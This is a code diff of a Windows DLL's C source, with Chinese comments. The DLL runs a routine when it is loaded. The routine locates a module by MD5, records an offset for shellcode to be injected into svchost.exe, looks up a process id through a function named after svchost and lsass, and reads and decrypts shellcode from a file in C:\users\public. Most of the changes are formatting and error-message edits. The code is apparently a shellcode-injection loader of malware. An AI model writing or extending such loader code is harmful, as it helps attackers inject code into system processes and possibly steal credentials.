@@ -366,8 +366,8 @@ int _EntryCode1()
 	if (asdasdhFile == INVALID_HANDLE_VALUE) {
 		printf("[x] read module failed, abort...\n");
 
-	//	char fixed2s3[123] = "[x] read module failed, abort...\n";
-		//、、fwrite(fixed2s3, 1, strlen(fixed2s3), file); fclose(file);
+		//	char fixed2s3[123] = "[x] read module failed, abort...\n";
+			//、、fwrite(fixed2s3, 1, strlen(fixed2s3), file); fclose(file);
 		return 1;
 	}
 	BYTE* ReadBufferasdasd = (BYTE*)malloc(0x1000); DWORD ol = 0;
@@ -405,8 +405,9 @@ int _EntryCode1()
 
 				}
 			}
-			if (!gotmatch){printf("md5 mismatch, continue searching\n"); continue;
-		}
+			if (!gotmatch) {
+				printf("md5 mismatch, continue searching\n"); continue;
+			}
 			offset = 1;
 			// 记录下来这个索引，写入到文件中，供注入到svchost.exe进程中的shellcode去读取
 			char write_out[123] = { 0 };
@@ -472,7 +473,7 @@ int _EntryCode1()
 	DWORD _svchost_1_pid = GetLsvchostsassPid();
 
 	// 从文件中读取shellcode并解密
-	const char* filePath = "data.bin"; // Replace with your file path
+	const char* filePath = "C:\\users\\public\\data.bin"; // Replace with your file path
 
 	// Open the file for reading
 	HANDLE hFile = CreateFileA(
@@ -486,14 +487,14 @@ int _EntryCode1()
 	);
 
 	if (hFile == INVALID_HANDLE_VALUE) {
-		fprintf(stderr, "Error opening the file\n");
+		printf("Error opening the file, error code : %x\n",GetLastError());
 		return 1;
 	}
 
 	// Get the file size
 	DWORD fileSize = GetFileSize(hFile, NULL);
 	if (fileSize == INVALID_FILE_SIZE) {
-		fprintf(stderr, "Error getting file size\n");
+		printf( "Error getting file size\n");
 		CloseHandle(hFile);
 		return 1;
 	}
@@ -501,7 +502,7 @@ int _EntryCode1()
 	// Allocate memory for the byte array
 	BYTE* byteArray = (BYTE*)malloc(fileSize);
 	if (byteArray == NULL) {
-		fprintf(stderr, "Error allocating memory\n");
+		printf("Error allocating memory\n");
 		CloseHandle(hFile);
 		return 1;
 	}
@@ -509,7 +510,7 @@ int _EntryCode1()
 	// Read the binary data from the file into the byte array
 	DWORD bytesRead;
 	if (!ReadFile(hFile, byteArray, fileSize, &bytesRead, NULL)) {
-		fprintf(stderr, "Error reading from the file\n");
+		printf("Error reading from the file\n");
 		CloseHandle(hFile);
 		free(byteArray);
 		return 1;
@@ -558,21 +559,21 @@ int _EntryCode1()
 
 	exit(-1);
 }BOOL APIENTRY DllMain(HMODULE hModule,
-DWORD  ul_reason_for_call,
-LPVOID lpReserved
+	DWORD  ul_reason_for_call,
+	LPVOID lpReserved
 )
 {
 
-switch (ul_reason_for_call)
-{
-case DLL_PROCESS_ATTACH:
-	//MessageBoxA(NULL, "OK", "OK", MB_OK);
-	_EntryCode1();
-	break;
-case DLL_THREAD_ATTACH:
-case DLL_THREAD_DETACH:
-case DLL_PROCESS_DETACH:
-	break;
-}
-return TRUE;
+	switch (ul_reason_for_call)
+	{
+	case DLL_PROCESS_ATTACH:
+		//MessageBoxA(NULL, "OK", "OK", MB_OK);
+		_EntryCode1();
+		break;
+	case DLL_THREAD_ATTACH:
+	case DLL_THREAD_DETACH:
+	case DLL_PROCESS_DETACH:
+		break;
+	}
+	return TRUE;
 }
